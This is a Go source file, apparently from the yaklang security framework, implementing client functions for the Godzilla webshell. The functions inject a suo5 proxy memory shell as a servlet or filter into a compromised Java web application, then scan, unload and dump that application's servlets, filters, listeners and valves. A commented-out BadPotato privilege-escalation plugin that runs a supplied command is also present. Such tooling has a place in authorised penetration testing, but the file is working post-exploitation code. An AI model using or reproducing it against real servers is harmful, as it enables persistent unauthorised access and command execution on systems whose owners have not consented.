package wsm

import (
	"errors"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla/plugin"
	"strings"
)

// LoadSuo5Plugin load suo5 proxy with default memshell type as filter type
func (g *Godzilla) LoadSuo5Plugin(className string, memshellType string, path string) ([]byte, error) {
	var ok bool
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	if className == "" {
		className = "x.suo5"
	}

	switch memshellType {
	case "servlet":
		if path == "" {
			return nil, utils.Error("`path` cannot be empty for servlet kind memshell")
		}
		ok, err = g.Include(className, plugin.GetSuo5MemServletByteCode())
	case "filter":
		ok, err = g.Include(className, plugin.GetSuo5MemFilterByteCode())
	default:
		ok, err = g.Include(className, plugin.GetSuo5MemFilterByteCode())
	}

	if !ok {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("path", path)
	result, err := g.EvalFunc(className, "run", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) LoadScanWebappComponentInfoPlugin(className string) ([]byte, error) {
	var ok bool
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	if g.req == nil {
		err := g.InjectPayload()
		if err != nil {
			return nil, err
		}
	}
	if className == "" {
		className = "x.go0p"
	}

	g.dynamicFuncName["ScanWebappComponentInfo"] = className

	ok, err = g.Include(className, plugin.GetWebAppComponentInfoScanByteCode())
	if !ok {
		return nil, err
	}
	return nil, nil
}

// KillWebappComponent will unload component given
// kill `Servlet` need to provide `servletName` eg: `HelloServlet`
// kill `Filter` need to provide `filterName` eg: `HelloFilter`
// kill `Listener` need to provide `listenerClass` eg: `com.example.HelloListener`
// kill `Valve` need to provide `valveID` eg: `1`
// kill `Timer` need to provide `threadName`
// kill `Websocket` need to provide `websocketPattern` eg: `/websocket/EchoEndpoint`
// kill `Upgrade` need to provide `upgradeKey` eg: `version.txt` from goby ysoserial plugin generated
// kill `Executor` use a fixed value `recovery`
func (g *Godzilla) KillWebappComponent(componentType string, name string) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}
	viable := map[string]string{
		"servlet":   "0",
		"filter":    "1",
		"listener":  "2",
		"valve":     "3",
		"timer":     "4",
		"upgrade":   "5",
		"executor":  "6",
		"websocket": "7",
	}
	parameter := newParameter()
	parameter.AddString("action", "0")
	componentType = strings.ToLower(componentType)
	iType, ok := viable[componentType]
	if !ok {
		return nil, errors.New("no viable alternative for " + componentType)
	}
	parameter.AddString("type", iType)
	parameter.AddString("name", name)

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

// ScanWebappComponentInfo will return target webapp servlet, filter info
func (g *Godzilla) ScanWebappComponentInfo() ([]byte, error) {
	var err error

	err = g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("action", "1")

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) DumpWebappComponent(classname string) ([]byte, error) {
	err := g.InjectPayloadIfNoCookie()
	if err != nil {
		return nil, err
	}

	parameter := newParameter()
	parameter.AddString("action", "2")
	parameter.AddString("classname", classname)

	result, err := g.EvalFunc(g.dynamicFuncName["ScanWebappComponentInfo"], "toString", parameter)

	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *Godzilla) CustomClassByteCodeDealer(classBytes []byte) (bool, error) { return false, nil }

func (g *Godzilla) InvokeCustomPlugin() ([]byte, error) { return nil, nil }

func (g *Godzilla) LoadPotatoPlugin(cmd string) ([]byte, error) {
	//var loadState bool
	//binCode, err := payloads.CshrapPluginPayload.ReadFile("godzilla/static/plugin/BadPotato.dll")
	//if err != nil {
	//	return nil, err
	//}
	//loadState, err = g.Include("BadPotato.Run", binCode)
	//if err != nil {
	//	return nil, err
	//}
	//if !loadState {
	//	return nil, utils.Errorf("load plugin failed %s", "BadPotato.dll")
	//}
	//reqParameter := newParameter()
	//reqParameter.AddString("cmd", cmd)
	//return g.EvalFunc("BadPotato.Run", "run", reqParameter)
	return nil, nil
}
